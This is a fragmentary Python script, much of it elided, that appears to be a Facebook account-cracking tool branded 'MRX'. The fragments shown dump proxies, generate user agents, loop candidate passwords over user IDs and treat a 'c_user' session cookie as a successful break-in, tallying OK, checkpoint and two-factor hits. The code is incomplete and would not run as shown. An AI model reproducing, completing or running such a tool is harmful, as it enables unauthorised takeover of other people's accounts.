...
try:
	print(f'\r\n [>] currently dump proxy and create useragent')
...
#				A += '\n'+p
	...
	sys.exit(f" [>] no internet connection")
...
except:sys.exit(f" [>] proxy dump failed")
...
logo =("""
\x1b[1;96m     .88b  d88. d8888b. db    db
\x1b[1;96m     88'YbdP`88 88  `8D `8b  d8'
\x1b[1;96m     88  88  88 88oobY'  `8bd8'
\x1b[1;96m     88  88  88 88`8b    .dPYb.
\x1b[1;96m     88  88  88 88 `88. .8P  Y8.
\x1b[1;96m     YP  YP  YP 88   YD YP\033[1;32mMrx Jibon                                                               
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r [\033[38;5;46m MRX \033[1;97m] [\033[38;5;45m%s\033[0m/%s] [OK\033[1;97m:-\033[38;5;46m%s\033[1;97m] [2F\033[1;97m:-\033[38;5;45m%s\033[1;97m] \r'%(loop,tl,len(ok),len(cp),len(twf))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f' \r\033[m[ MTX ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
